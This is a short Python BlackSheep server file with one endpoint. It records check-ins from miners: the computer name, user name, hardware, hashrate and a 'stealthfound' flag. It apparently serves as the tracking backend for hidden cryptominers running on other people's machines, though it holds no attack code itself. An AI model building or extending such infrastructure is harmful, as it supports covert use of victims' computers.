from blacksheep.server.application import Application
from blacksheep.server.responses import json, text
from blacksheep.messages import Request
from blacksheep.server.routing import Router

from db.CRUD import Users, Miners

# Создаем объекты для работы с базой данных
users_db = Users()
miners_db = Miners()

router = Router()



@router.route("/endpoint", methods=["GET", "POST"])
async def miners_endpoint(request: Request):
    if request.method == "POST":
        data = await request.json()
        if "stealthfound" in data:
            stealthfound = data["stealthfound"]
        else:
            stealthfound = None
        if await miners_db.check_miner_exists(data['id']):
            await miners_db.update_miner(data['id'], data['computername'], data['username'], data['gpu'], data['cpu'], data['runtime'], data["hashrate"], stealthfound)
        else:
            await miners_db.add_miner(data['id'], data['computername'], data['username'], data['gpu'], data['cpu'], data['runtime'], data["hashrate"], stealthfound)
    return text("Done")
